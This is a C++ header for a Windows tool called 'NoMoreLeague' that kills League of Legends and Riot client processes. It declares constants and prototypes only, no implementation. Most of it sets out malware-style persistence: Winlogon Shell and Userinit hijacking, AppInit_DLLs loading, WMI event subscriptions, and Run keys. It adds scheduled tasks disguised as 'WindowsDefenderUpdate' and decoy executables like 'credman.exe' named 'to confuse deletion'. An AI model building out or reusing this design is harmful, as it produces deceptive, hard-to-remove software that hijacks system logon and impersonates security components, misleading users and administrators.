#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <shlobj.h>
#include <psapi.h>
#include <shellapi.h>
#include <tchar.h>
#include <iostream>
#include <string>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")

#ifndef UNICODE
typedef std::string String;
#else
typedef std::wstring String;
#endif

// Application constants
static const TCHAR APP_NAME[] = TEXT("NoMoreLeague");
static const TCHAR WEBSITE[] = TEXT("https://leetcode.com");

// Registry constants for kill switch
static const TCHAR REG_APP_KEY[] = TEXT("Software\\NoMoreLeague");
static const TCHAR REG_KILL_SWITCH_VAL[] = TEXT("KillSwitch");

// Registry constants for startup Run keys
static const TCHAR REG_RUN_KEY[] = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

// Winlogon HKCU persistence key - hijacks shell init on every logon
static const TCHAR REG_WINLOGON_KEY[] = TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
static const TCHAR REG_WINLOGON_SHELL_VAL[] = TEXT("Shell");

// AppInit_DLLs registry key for auto-loading persistence
static const TCHAR REG_APPINIT_KEY[] = TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows");
static const TCHAR REG_APPINIT_VAL[] = TEXT("AppInit_DLLs");
static const TCHAR REG_APPINIT_LOAD_VAL[] = TEXT("LoadAppInit_DLLs");

// Additional startup locations
static const TCHAR REG_USER_INIT_KEY[] = TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
static const TCHAR REG_USER_INIT_VAL[] = TEXT("Userinit");

// Scheduled task names for multiple persistence vectors
static const TCHAR SCHTASK_NAME_MAIN[] = TEXT("NoMoreLeague");
static const TCHAR SCHTASK_NAME_BACKUP[] = TEXT("SystemHealthCheck");
static const TCHAR SCHTASK_NAME_TERTIARY[] = TEXT("WindowsDefenderUpdate");

// Decoy file name constants (generic-sounding names to confuse deletion)
static const TCHAR DECOY_WINLOGON_HELPER[] = TEXT("WinLogonHelper.exe");
static const TCHAR DECOY_UPDATESRV[] = TEXT("updatesrv.exe");
static const TCHAR DECOY_CREDMAN[] = TEXT("credman.exe");
static const TCHAR DECOY_SYSTEMHELPER[] = TEXT("SystemHelper.exe");
static const TCHAR DECOY_WINUPDATESVC[] = TEXT("WinUpdateSvc.exe");

// WMI event subscription names
static const TCHAR WMI_FILTER_NAME[] = TEXT("\\\\root\\subscription:__EventFilter.NoMoreLeague");
static const TCHAR WMI_CONSUMER_NAME[] = TEXT("\\\\root\\subscription:CommandLineEventConsumer.NoMoreLeague");
static const TCHAR WMI_BINDING_NAME[] = TEXT("\\\\root\\subscription:__FilterToConsumerBinding.NoMoreLeague");

// Mutex name to ensure single instance
static const TCHAR MUTEX_NAME[] = TEXT("Local\\NoMoreLeagueSingleInstanceMutex");

// Known League of Legends process names to detect and terminate
// Updated list includes all known LoL/Riot executable variants from recent patches
static const TCHAR* const TARGET_PROCESSES[] = {
    TEXT("LeagueClient.exe"),
    TEXT("LeagueClientUx.exe"),
    TEXT("LeagueClientUxRender.exe"),
    TEXT("League of Legends.exe"),
    TEXT("League of Legends (Riot client).exe"),
    TEXT("LolClient.exe"),
    TEXT("LofClient.exe"),
    TEXT("LeagueCrashHandler.exe"),
    TEXT("LeagueUE4CrashHandler.exe"),
    TEXT("RiotClientServices.exe"),
    TEXT("RiotClientMtl.exe"),
    TEXT("RiotClientUx.exe"),
    TEXT("RiotClientUxRender.exe"),
    TEXT("LoLSafeGuard.exe"),
    TEXT("LoLOnCall.exe"),
    TEXT("LoLOnCallDriver64.exe"),
    TEXT("RiotShell.exe"),
    TEXT("RiotShellServices.exe"),
    TEXT("PVPNT.exe"),
    TEXT("LeagueTMP.exe"),
};
static const size_t TARGET_PROCESSES_COUNT = sizeof(TARGET_PROCESSES) / sizeof(TARGET_PROCESSES[0]);

// Function prototypes
bool isSystemWindows();
bool getExecutablePath(TCHAR* pathBuffer, DWORD bufferSize);

// Kill switch management (read-only; flipped manually via the registry)
bool isKillSwitchActive();

// Multi-layered persistence mechanisms
bool setRegistryRunKey(HKEY hRootKey, bool enable);
bool copyToStartupFolder(bool allUsers);
bool removeStartupFolderFile(bool allUsers);
bool setScheduledTask(bool enable);
bool setScheduledTaskWithName(const TCHAR* taskName, const TCHAR* exePath, bool enable);

// Winlogon Shell hijack persistence
bool setWinlogonShellPersistence(bool enable);
bool isWinlogonShellActive();

// AppInit_DLLs registry persistence (loads any DLL on every app startup)
bool setAppInitPersistence(bool enable);

// Decoy file deployment for redundancy
bool deployDecoyFiles();
bool setupDecoyBackup(const TCHAR* fileName);
bool restoreFromDecoys();

// Additional persistence locations: Internet Explorer, Quick Launch
bool createQuickLaunchShortcut();
bool setInternetExplorerStartup();
bool removeQuickLaunchShortcut();

void createPersistence();
void removePersistence();

// Monitoring and process killing
bool isLeagueProcess(const TCHAR* processName);
bool findAndKill(DWORD processID);
void scanAndKillLeague();
void createPopup();